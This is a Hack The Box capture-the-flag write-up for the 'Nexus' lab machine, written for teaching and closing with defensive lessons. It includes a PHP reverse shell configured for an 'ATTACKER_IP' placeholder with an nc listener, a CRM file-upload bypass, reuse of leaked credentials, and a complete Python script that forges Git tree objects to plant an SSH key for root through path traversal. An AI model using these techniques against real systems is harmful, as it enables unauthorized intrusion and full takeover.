# Hack The Box - Nexus

## Overview

**Nexus** is an easy Linux machine built around web enumeration, exposed Git history, credential reuse, vulnerable file upload handling, and a custom Gitea template synchronization service.

The attack path connects several concepts:

`Web enumeration -> VHost discovery -> Gitea -> Git history credential leak -> Krayin CRM -> CVE-2026-38526 -> www-data -> credential reuse -> jones -> vulnerable template sync -> directory traversal -> root`

What made this machine interesting was that the final privilege escalation was not based on a standard `sudo` misconfiguration or known local exploit. It required understanding how a custom Python service processed attacker-controlled Git tree paths.

---

## Initial Enumeration

I started with a full TCP port scan followed by service and default script enumeration.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.234.54 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

nmap -p$ports -sC -sV 10.129.234.54
```

The important services were:

```text
22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp  open  http  nginx 1.24.0
```

The HTTP service redirected to:

```text
nexus.htb
```

So I added the hostname locally:

```bash
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

The main site appeared to belong to the Nexus Energy Authority.

---

## Website Enumeration

Looking through the website revealed a careers section containing a job posting for an Operations Specialist.

The posting exposed two useful email addresses:

```text
careers@nexus.htb
j.matthew@nexus.htb
```

The second address gave us a likely username and became important later.

At this point there was no obvious functionality on the main site that provided a foothold, so I moved on to virtual host enumeration.

---

## Virtual Host Enumeration

I used `ffuf` to search for additional virtual hosts.

```bash
ffuf \
  -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
  -u http://nexus.htb/ \
  -H "Host: FUZZ.nexus.htb"
```

Several responses had identical characteristics, so I filtered the common response by word count:

```bash
ffuf \
  -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
  -u http://nexus.htb/ \
  -H "Host: FUZZ.nexus.htb" \
  -fw 4
```

This revealed two interesting hosts:

```text
git.nexus.htb
billing.nexus.htb
```

I added them to `/etc/hosts`.

```text
10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb
```

---

## Gitea Enumeration

Browsing to:

```text
git.nexus.htb
```

revealed a Gitea instance.

While enumerating the available repositories, I found:

```text
krayin-docker-setup
```

The repository contained configuration for a Krayin CRM deployment, including an exposed `.env` file.

More importantly, checking the repository's **commit history** revealed that an earlier version of the `.env` file contained a password that had later been removed.

This was an important reminder that deleting a secret from the current version of a Git repository does not remove it from Git history.

The `.env` configuration also referenced:

```text
billing.nexus.htb
```

which matched the virtual host discovered earlier.

---

## Krayin CRM

Browsing to:

```text
billing.nexus.htb
```

revealed a Krayin CRM login page.

The application identified itself as:

```text
Krayin CRM 2.2.0
```

I combined the information discovered during enumeration:

```text
Username/email: j.matthew@nexus.htb
Password: recovered from Gitea commit history
```

The credentials successfully authenticated to the CRM.

---

## CVE-2026-38526

Krayin CRM 2.2.0 was vulnerable to **CVE-2026-38526**.

The vulnerable attachment functionality could be abused to upload a PHP file and have it stored in a web-accessible location.

I prepared a PHP reverse shell and configured it with my HTB VPN IP and listener port.

Example:

```php
$ip = 'ATTACKER_IP';
$port = 4455;
```

Inside Krayin, I navigated to the email functionality and composed a new message.

I selected the option to attach a file and uploaded the reverse shell.

The upload request was intercepted using Burp Suite.

During interception, the uploaded filename was changed from:

```text
php-reverse-shell.png
```

to:

```text
php-reverse-shell.php
```

The modified request was then forwarded.

---

## Initial Shell

Before triggering the uploaded file, I started a listener:

```bash
nc -lnvp 4455
```

The uploaded PHP file could then be requested from its location under:

```text
http://billing.nexus.htb/storage/tinymce/
```

Requesting the uploaded `.php` file caused the target to connect back to the listener.

The resulting shell was running as:

```text
uid=33(www-data) gid=33(www-data)
```

I upgraded the shell:

```bash
script /dev/null -c /bin/bash
```

This gave a more usable interactive Bash shell.

---

## Credential Discovery

With access as `www-data`, I enumerated the Krayin application directory.

The application's `.env` file contained database credentials in cleartext:

```text
DB_USERNAME=krayin
DB_PASSWORD=<REDACTED>
```

I then checked the local users:

```bash
cat /etc/passwd
```

One normal user stood out:

```text
jones:x:1000:1000:,,,:/home/jones:/bin/bash
```

I tested the password recovered from the application configuration against `jones` over SSH.

```bash
ssh jones@nexus.htb
```

The password was reused and authentication succeeded.

```bash
id
```

returned:

```text
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
```

The user flag was available at:

```text
/home/jones/user.txt
```

---

# Privilege Escalation

## Systemd Timer Enumeration

From the `jones` account, I continued enumerating the system.

```bash
systemctl list-timers
```

This revealed:

```text
gitea-template-sync.timer
```

The timer periodically executed a Gitea template synchronization service.

The corresponding Python script was located at:

```text
/etc/gitea/template-sync.py
```

Reading the script revealed the core issue.

The service cloned Gitea template repositories and copied their contents into a staging directory resembling:

```text
/home/git/template-staging/<owner>/<repo>/
```

The destination path was constructed using:

```python
target = os.path.join(stage_path, filepath)
```

The value of `filepath` ultimately came from Git tree data.

There was no validation preventing directory traversal sequences such as:

```text
..
```

from appearing in the path.

That meant a malicious Git tree could escape the intended staging directory.

---

## Understanding the Vulnerability

Normally Git prevents creating paths containing `..`.

For example, attempting to create:

```text
../../../../../root/.ssh/authorized_keys
```

through normal Git commands would fail because Git validates repository paths.

However, Git repositories are fundamentally composed of objects:

```text
blob
tree
commit
```

If the Git objects are constructed manually, it is possible to create a tree containing path components that normal Git commands would reject.

The vulnerable sync script trusted these paths.

This gave us the following attack chain:

```text
Malicious Git tree
        |
        v
template-sync.py
        |
        v
os.path.join(stage_path, filepath)
        |
        v
Directory traversal
        |
        v
/root/.ssh/authorized_keys
```

Because the synchronization service had sufficient privileges to write the resulting path, this could be used to install our SSH public key for root.

---

## Generate an SSH Key

On the attacking machine, I generated a new Ed25519 key pair:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

This created:

```text
/tmp/.k
/tmp/.k.pub
```

The public key would become the contents of root's `authorized_keys`.

---

## Create a Malicious Template Repository

Using the `jones` account on Gitea, I created a new repository named:

```text
rce
```

The important setting was:

```text
Make repository a template
```

This ensured the automated template synchronization service would process the repository.

I then cloned it:

```bash
cd /tmp

git clone http://jones:<PASSWORD>@git.nexus.htb/jones/rce.git

cd rce

touch README.md
```

---

## Building Raw Git Objects

Normal Git path validation prevented directly creating the traversal path.

To bypass this, raw Git objects were written directly into:

```text
.git/objects/
```

The payload needed the synchronization service to resolve a path equivalent to:

```text
../../../../../root/.ssh/authorized_keys
```

The following Python script constructs the required Git objects.

```python
#!/usr/bin/env python3

import hashlib
import os
import subprocess
import sys
import time
import zlib


def write_obj(data, object_type):
    header = ("%s %d" % (object_type, len(data))).encode() + b"\x00"
    raw = header + data

    sha = hashlib.sha1(raw).hexdigest()

    directory = os.path.join(".git", "objects", sha[:2])
    os.makedirs(directory, exist_ok=True)

    path = os.path.join(directory, sha[2:])

    if not os.path.exists(path):
        with open(path, "wb") as f:
            f.write(zlib.compress(raw))

    return sha


def entry(mode, name, sha):
    return (
        ("%s %s" % (mode, name)).encode()
        + b"\x00"
        + bytes.fromhex(sha)
    )


if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)


result = subprocess.run(
    ["cat", "/tmp/.k.pub"],
    capture_output=True,
    text=True
)

if result.returncode != 0:
    print("Generate the key first:")
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
    sys.exit(1)


key = result.stdout.strip() + "\n"

blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

ssh_tree = write_obj(
    entry("100644", "authorized_keys", blob),
    "tree"
)

current = write_obj(
    entry("40000", ".ssh", ssh_tree),
    "tree"
)

current = write_obj(
    entry("40000", "root", current),
    "tree"
)

for _ in range(4):
    current = write_obj(
        entry("40000", "..", current),
        "tree"
    )

root = write_obj(
    entry("100644", "README.md", readme)
    + entry("40000", "..", current),
    "tree"
)

timestamp = int(time.time())

commit = (
    "tree %s\n"
    "author x <x@x> %d +0000\n"
    "committer x <x@x> %d +0000\n"
    "\n"
    "init\n"
) % (root, timestamp, timestamp)

sha = write_obj(commit.encode(), "commit")

os.makedirs(
    os.path.join(".git", "refs", "heads"),
    exist_ok=True
)

with open(".git/refs/heads/main", "w") as f:
    f.write(sha + "\n")

print("Done: " + sha)
```

The important part is that the script manually constructs tree objects containing `..`.

The resulting path escapes the template staging directory and targets:

```text
/root/.ssh/authorized_keys
```

---

## Push the Malicious Tree

I executed the script:

```bash
python3 /tmp/build.py
```

Then pushed the resulting branch:

```bash
git push -u origin main --force
```

Because the repository had been marked as a Gitea template, the scheduled synchronization service eventually processed it.

The synchronization log could be monitored at:

```bash
cat /var/log/template-sync.log
```

The key line confirming exploitation was:

```text
synced: ../../../../../root/.ssh/authorized_keys
```

The sync service had followed the traversal path and written our SSH public key into root's SSH configuration.

---

## Root Access

With the public key installed, I authenticated using the corresponding private key:

```bash
ssh -i /tmp/.k root@nexus.htb
```

This provided a root shell.

```bash
id
```

Expected result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The root flag was located at:

```text
/root/root.txt
```

Nexus was complete.

---

# Attack Path

```text
Nmap
  |
  v
nexus.htb
  |
  +--> Careers page
  |      |
  |      +--> j.matthew@nexus.htb
  |
  v
VHost enumeration
  |
  +--> git.nexus.htb
  |
  +--> billing.nexus.htb
          ^
          |
Gitea repository
  |
  +--> krayin-docker-setup
  |
  +--> exposed .env
  |
  +--> old commit leaks password
  |
  v
Krayin CRM 2.2.0
  |
  v
CVE-2026-38526
  |
  v
PHP reverse shell
  |
  v
www-data
  |
  +--> Krayin .env
  |
  +--> cleartext credentials
  |
  v
SSH as jones
  |
  v
gitea-template-sync.timer
  |
  v
template-sync.py
  |
  +--> attacker-controlled Git paths
  |
  +--> unsanitized os.path.join()
  |
  v
Git tree directory traversal
  |
  v
/root/.ssh/authorized_keys
  |
  v
SSH as root
```

---

# Key Lessons

## Git History Can Leak Removed Secrets

Removing a password from the current version of a repository does not remove it from previous commits.

During source code review, checking only the current files is not enough.

Useful areas to inspect include:

```bash
git log
git show
git diff
```

Secrets committed once should generally be considered compromised even if they are later deleted.

---

## Credential Reuse Turns Small Leaks Into Larger Compromises

The machine demonstrated how credentials discovered in one application can provide access to another service.

The path progressed through multiple systems because credentials were exposed and reused.

This is why a credential leak should not be evaluated only in the context of the application where it was found.

---

## Application Configuration Files Are High-Value Targets

After obtaining the `www-data` shell, the Krayin `.env` file exposed additional credentials.

Files such as:

```text
.env
config.php
settings.py
application.yml
docker-compose.yml
```

are worth inspecting after gaining access to a web application's filesystem.

---

## Custom Services Deserve Close Inspection

The final privilege escalation came from a custom synchronization service rather than a common Linux misconfiguration.

The vulnerable logic was effectively:

```python
target = os.path.join(stage_path, filepath)
```

`os.path.join()` constructs a path. It does not guarantee that the resulting path remains inside the intended directory.

Attacker-controlled paths should be normalized and validated before filesystem operations are performed.

---

## Git Internals Can Bypass Normal Client Restrictions

Normal Git commands reject dangerous paths containing `..`.

That protection did not mean such paths could never exist inside Git's underlying object database.

By constructing raw blob, tree, and commit objects directly, the malicious repository contained a structure that the normal Git interface would not allow.

The vulnerable service then trusted that structure.

This was the most interesting part of Nexus because exploitation required understanding both sides of the vulnerability:

```text
Git object manipulation + unsafe filesystem path handling
```

---

# Defensive Notes

From a defensive perspective, several points in this attack chain could have been detected or prevented.

Secrets should never be committed to Git repositories. If credentials are accidentally committed, removing them in a later commit is insufficient. The credentials should be rotated and the repository history cleaned where appropriate.

Web applications should strictly validate uploaded files using more than filename extensions, and uploaded content should not be stored in executable web directories.

Application service accounts should use unique credentials so that compromise of one application does not provide authentication to local system users.

Most importantly, automated services processing attacker-controlled repository contents should treat filenames and paths as untrusted input.

A safe implementation should resolve the final path and verify that it remains inside the intended staging directory before writing any file.

---

# Skills Practiced

- Nmap service enumeration
- Virtual host enumeration with ffuf
- Gitea repository enumeration
- Git commit history analysis
- Credential discovery and reuse
- Krayin CRM exploitation
- CVE-2026-38526
- Burp Suite request manipulation
- PHP reverse shells
- Linux post-exploitation enumeration
- SSH access
- systemd timer enumeration
- Python source code analysis
- Git object internals
- Directory traversal
- SSH key based privilege escalation

---

## Disclaimer

This writeup documents techniques used in an authorized Hack The Box lab environment for educational purposes.
